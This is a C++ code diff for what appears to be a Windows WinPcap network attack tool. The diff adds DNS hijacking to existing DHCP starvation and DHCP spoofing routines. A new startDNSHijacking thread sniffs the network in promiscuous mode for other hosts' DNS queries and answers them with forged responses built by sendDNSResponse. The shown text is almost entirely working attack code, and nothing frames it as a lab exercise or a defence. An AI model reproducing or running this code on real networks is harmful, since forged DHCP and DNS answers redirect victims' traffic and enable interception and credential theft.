@@ -113,6 +113,28 @@ int sendACKPacket(char* raw_packet, DHCP_header& rDHCP, IP_header& rIP, pcap_t* 
 
 int sendDNSResponse(char* raw_packet, char* qDNS, pcap_t* sock, AddressInfo& info)
 {
+	Ethernet_header ether{};
+	IP_header ip{};
+	UDP_header udp{};
+	DNS_header dns{};
+	DNS_query query{};
+
+	getEthernetheader(qDNS, 0, ether);
+	getIPheader(qDNS, sizeof(Ethernet_header), ip);
+	getUDPheader(qDNS, sizeof(Ethernet_header) + sizeof(IP_header), udp);
+	getDNSheader(qDNS, sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header), dns);
+	query = *(DNS_query*)&qDNS[sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DNS_header)];
+	int tSize = createDNSResponsePacket(raw_packet, (void*)&dns, (void*)&ip, (void*)&udp, (void*)&query, (void*)&ether, info);
+
+	if(pcap_sendpacket(
+		sock,
+		(u_char*)raw_packet,
+		tSize
+	) != 0 )
+	{
+		std::cout << "error " << pcap_geterr(sock) << std::endl;
+		return 1;
+	}
 	return 0;
 }
 
@@ -127,7 +149,7 @@ DWORD WINAPI startDHCPStarvation(LPVOID info)
 	return 1;
 }
 
-DWORD WINAPI startSpoofing(LPVOID info)
+DWORD WINAPI startDHCPSpoofing(LPVOID info)
 {
 	SOCKET s;
 	sockaddr_in sockinfo;
@@ -178,7 +200,7 @@ DWORD WINAPI startSpoofing(LPVOID info)
 	if (!sock)
 	{
 		std::cout << "error in pcap socket" << std::endl;
-		return 1;
+		return -1;
 	}
 
 	// listening 
@@ -204,5 +226,44 @@ DWORD WINAPI startSpoofing(LPVOID info)
 	delete[] ack_packet;
 	delete[] raw_packet;
 	closesocket(s);
+	pcap_close(sock);
+	return -1;
+}
+
+DWORD WINAPI startDNSHijacking(LPVOID info)
+{
+	pcap_t* sock = pcap_open(getDeviceName(*(AddressInfo*)info), 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
+	pcap_pkthdr header;
+
+	bool sent = false;
+	u_char* raw_packet;
+	char* DNS_packet = new char[65536];
+
+
+	UDP_header* udp;
+	IP_header* ip;
+
+	if (!sock)
+	{
+		std::cout << "error in pcap socket" << std::endl;
+		return -1;
+	}
+
+	while (!sent)
+	{
+		memset(DNS_packet, 0, 65536);
+		raw_packet = (u_char*)pcap_next(sock, &header);
+
+		if (!header.len)
+			break;
+
+		udp = (UDP_header*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header)];
+		ip = (IP_header*)&raw_packet[sizeof(Ethernet_header)];
+		if (udp->dst_port == 53 && ip->ip_srcaddr != inet_addr((char*)(*(AddressInfo*)info).ipv4))
+			sent = sendDNSResponse(DNS_packet, (char*)raw_packet, sock, *(AddressInfo*)info);
+
+	}
+	delete[] DNS_packet;
+	pcap_close(sock);
 	return -1;
 }
